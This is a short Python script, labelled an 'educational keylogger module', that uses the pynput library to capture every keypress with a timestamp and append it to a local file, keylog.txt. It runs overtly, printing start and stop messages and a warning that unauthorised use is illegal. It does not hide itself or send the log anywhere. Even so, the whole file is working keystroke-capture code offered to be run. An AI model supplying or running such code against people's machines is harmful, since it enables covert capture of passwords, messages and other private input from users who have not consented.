#!/usr/bin/env python3
"""
Educational Keylogger Module
This module demonstrates how keyloggers work for cybersecurity learning purposes.
WARNING: Using without authorization is illegal!
"""

from pynput import keyboard
import datetime
import os

class KeyloggerModule:
    """Educational keylogger for demonstrating keystroke capture"""
    
    def __init__(self, log_file='keylog.txt'):
        self.log_file = log_file
        self.listener = None
        
    def on_press(self, key):
        """Called when a key is pressed"""
        try:
            with open(self.log_file, 'a') as f:
                timestamp = datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')
                
                # Handle special keys
                if hasattr(key, 'char'):
                    if key.char:
                        f.write(f"[{timestamp}] {key.char}")
                else:
                    key_name = key.name if hasattr(key, 'name') else str(key)
                    f.write(f"[{timestamp}] <{key_name}> ")
                    
        except Exception as e:
            print(f"Error logging key: {e}")
    
    def start_logging(self):
        """Start capturing keystrokes"""
        print("[*] Keylogger started (Educational Purpose Only)")
        print("[*] Press Ctrl+C to stop")
        
        self.listener = keyboard.Listener(on_press=self.on_press)
        self.listener.start()
        self.listener.join()
    
    def stop_logging(self):
        """Stop capturing keystrokes"""
        if self.listener:
            self.listener.stop()
            print("[*] Keylogger stopped")

if __name__ == "__main__":
    keylogger = KeyloggerModule()
    try:
        keylogger.start_logging()
    except KeyboardInterrupt:
        keylogger.stop_logging()
